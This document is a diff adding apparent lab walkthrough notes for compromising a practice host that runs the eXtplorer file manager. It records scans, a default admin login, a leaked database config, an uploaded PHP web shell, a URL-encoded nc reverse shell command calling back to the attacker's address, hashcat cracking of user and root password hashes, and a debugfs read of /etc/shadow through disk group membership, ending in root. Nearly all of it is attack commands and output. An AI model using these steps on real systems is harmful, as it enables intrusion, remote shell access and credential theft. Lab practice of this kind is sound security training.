@@ -1,0 +1,81 @@
+$ sudo nmap -sCV -p- -v -Pn --open 192.168.161.16 > Extplorer.txt
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
+|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
+|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+$ wpscan --url http://192.168.161.16 --enumerate at,ap --plugins-detection aggressive
+WordPress version 6.2
+
+$ sudo nmap -sV -A --script vuln 192.168.161.16
+# Found http://192.168.161.16/filemanager/
+login in with admin:admin
+
+$GLOBALS['DB_HOST'] = 'localhost';
+$GLOBALS['DB_NAME'] = 'webdav';
+$GLOBALS['DB_USER'] = 'root';
+$GLOBALS['DB_PASSWORD'] = '';
+$GLOBALS['DB_TYPE'] = 'mysql';
+
+dora:$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS
+
+# upload shell.php	
+http://192.168.161.16/filemanager/config/shell.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+http://192.168.161.16/filemanager/config/shell.php?cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|bash+-i+2>%261|nc+192.168.45.178+443+>/tmp/f
+
+$ rlwrap nc -nlvp 443 
+listening on [any] 443 ...
+connect to [192.168.45.178] from (UNKNOWN) [192.168.161.16] 60008
+bash: cannot set terminal process group (1173): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@dora:/var/www/html/filemanager/config$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+# Interesting output from enumeration tools
+Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
+Sudo version 1.8.31
+CVE: CVE-2021-3493 | Name: Ubuntu OverlayFS
+CVE: CVE-2021-22555 | Name: Netfilter heap out-of-bounds write 
+[+] [CVE-2021-3156] sudo Baron Samedit 2
+
+uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
+
+$ hashcat -m 3200 '$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS' /usr/share/wordlists/rockyou.txt
+dora:doraemon
+
+su dora
+Password: doraemon
+$ id
+uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)
+
+df -h / # to confirm / mounted on /dev/mapper/ubuntu--vg-ubuntu--lv
+Filesystem                         Size  Used Avail Use% Mounted on
+/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
+
+dora@dora:~$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
+debugfs:  cat /etc/shadow
+root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::
+
+$ hashcat --identify roothash
+1800 | sha512crypt $6$, SHA512 (Unix)
+
+$ hashcat -m 1800 roothash /usr/share/wordlists/rockyou.txt
+root:explorer
+
+dora@dora:~$ su root
+Password: explorer
+root@dora:/home/dora# id
+uid=0(root) gid=0(root) groups=0(root)
+
+
+
+
